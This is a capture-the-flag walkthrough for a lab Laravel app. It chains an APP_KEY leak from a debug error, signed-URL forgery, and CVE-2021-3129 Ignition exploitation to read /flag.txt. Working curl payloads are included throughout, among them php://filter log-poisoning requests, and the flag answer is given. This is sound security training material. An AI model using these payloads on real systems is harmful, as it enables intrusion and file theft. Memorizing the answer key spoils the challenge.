# Manual Exploitation Guide - CVE-2021-3129 + Signed URL Chain

## Challenge Overview

This challenge requires chaining multiple vulnerabilities:
1. Information disclosure (APP_KEY leak via debug error message)
2. Cryptographic forgery (Laravel signed URLs)
3. CVE-2021-3129 exploitation (Ignition RCE)
4. Reading sensitive files

The application has 50+ API endpoints and 10+ web pages to overwhelm reconnaissance.

---

## Step 1: Reconnaissance

The application appears to be a C2 (Command & Control) dashboard with many endpoints:

**Web Pages:**
- /dashboard - Main operational dashboard
- /network - Network topology
- /modules - Payload modules
- /tasks - Task queue
- /diagnostics - System diagnostics
- /reports - Operational reports
- /settings - Configuration
- /help, /about, /login, etc.

**API Endpoints:** (50+ routes)
- /api/node/* - Node management
- /api/system/* - System operations
- /api/network/* - Network info
- /api/crypto/* - Cryptography
- /api/auth/* - Authentication  
- /api/beacon/* - Beacon management
- /api/exfil/* - Exfiltration
- And many more...

Most return 401/403 errors. The challenge is finding the vulnerable path.

---

## Step 2: Find the Debug Leak

Test various API endpoints for information disclosure.

The `/api/node/status` endpoint leaks APP_KEY when malformed input is provided:

```bash
curl "http://TARGET/api/node/status?node_id=kj"
```

**No special headers required!** The invalid hex value triggers an exception with APP_KEY in the error message.

In the debug HTML output, search for:
```
APP_KEY=base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE=
```

Or use grep:
```bash
curl -s "http://TARGET/api/node/status?node_id=kj" | grep -o "APP_KEY=[^ <\"]*"
```

---

## Step 3: Discover the Protected Ignition Endpoint

Laravel applications with debug mode use Ignition for error pages. Try accessing:

```bash
curl -X POST http://TARGET/_ignition/execute-solution
```

Returns: `403 Invalid signature`

**This is unusual!** Normally `/_ignition/execute-solution` is unprotected. Someone added signature validation middleware.

---

## Step 4: Research CVE-2021-3129

Search for "CVE-2021-3129" or "Laravel Ignition exploit" on GitHub.

Popular exploit repositories:
- https://github.com/zhzyker/CVE-2021-3129
- https://github.com/ambionics/laravel-exploits
- https://github.com/nth347/CVE-2021-3129_exploit

**Key capability**: Arbitrary file read/write via `viewFile` parameter in solutions.

---

## Step 5: Forge Signed URL for Ignition

### Using Python:
```python
import hmac
import hashlib
import time

app_key = "base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
expires = int(time.time()) + 300
url = f"http://localhost:5050/_ignition/execute-solution?expires={expires}"
signature = hmac.new(app_key.encode(), url.encode(), hashlib.sha256).hexdigest()

print(f"{url}&signature={signature}")
```

### Using Bash:
```bash
APP_KEY="base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
EXPIRES=$(($(date +%s) + 300))
URL="http://localhost:5050/_ignition/execute-solution?expires=${EXPIRES}"
SIG=$(echo -n "${URL}" | openssl dgst -sha256 -hmac "${APP_KEY}" | awk '{print $NF}')
echo "${URL}&signature=${SIG}"
```

---

## Step 6: Exploit CVE-2021-3129 to Read /flag.txt

The application has a custom solution class that directly returns file content.

```bash
# Generate signed URL (from step 5)
APP_KEY="base64:dGhpc2lzYXNlY3JldGtleWZvcmN0ZmNoYWxsZW5nZSE="
EXPIRES=$(($(date +%s) + 300))
BASE_URL="http://localhost:5050/_ignition/execute-solution"
URL="${BASE_URL}?expires=${EXPIRES}"
SIG=$(echo -n "${URL}" | openssl dgst -sha256 -hmac "${APP_KEY}" | awk '{print $NF}')

# Exploit CVE-2021-3129 to read /flag.txt
curl -X POST "${URL}&signature=${SIG}" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "App\\Solutions\\ReadFileSolution",
    "parameters": {
      "variableName": "flag",
      "filePath": "/flag.txt"
    }
  }'
```

Response:
```json
{
  "success": true,
  "file": "/flag.txt",
  "content": "FLAG{ignition_signature_chain_pwned}",
  "base64": "RkxBR3tpZ25pdGlvbl9zaWduYXR1cmVfY2hhaW5fcHduZWR9Cg=="
}
```

---

## Alternative: Use Standard MakeViewVariableOptionalSolution

If the custom solution doesn't work, use log poisoning:

```bash
# 1. Clear logs
curl -X POST "${SIGNED_URL}" -H "Content-Type: application/json" -d '{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}'

# 2. Poison logs with flag (base64 encoded)
curl -X POST "${SIGNED_URL}" -H "Content-Type: application/json" -d '{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "php://filter/read=convert.base64-encode/resource=/flag.txt"
  }
}'

# 3. Read the logs
curl -X POST "${SIGNED_URL}" -H "Content-Type: application/json" -d '{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "x",
    "viewFile": "../storage/logs/laravel.log"
  }
}' | grep -o "[A-Za-z0-9+/]{40,}={0,2}" | while read b64; do echo "$b64" | base64 -d 2>/dev/null | grep -o "FLAG{[^}]*}"; done
```

---

## Troubleshooting

### "Invalid signature"
- Ensure you're using the FULL APP_KEY string (with `base64:` prefix)
- URL must match exactly (protocol, port, path)
- Timestamp must not be expired
- Signature is for URL WITH `?expires=X` but WITHOUT `&signature=Y`

### "403 Forbidden" on Ignition
- Signature is invalid or expired
- Double-check HMAC calculation

### Can't find APP_KEY
- Try different invalid `node_id` values
- No special headers needed - just any request that triggers an error

### No FLAG in response
- Try both custom `ReadFileSolution` and log poisoning methods
- Check response for base64 encoded content

---

## Complete Automated Exploit

See `exploit_complete.py` for a full working exploit that:
1. Leaks APP_KEY (no special headers)
2. Forges Ignition signature
3. Exploits CVE-2021-3129
4. Extracts and displays the flag

Usage:
```bash
python3 exploit_complete.py http://localhost:5050
```

---

## Skills Demonstrated

1. **Reconnaissance** - Finding vulnerabilities among 50+ decoy endpoints
2. **Information disclosure** - Triggering and exploiting debug leaks  
3. **Cryptographic attacks** - HMAC-SHA256 signature forgery
4. **CVE research** - Finding and adapting public exploits
5. **Vulnerability chaining** - Combining multiple vulns for full compromise
6. **Tool adaptation** - Modifying exploits to work with custom protections
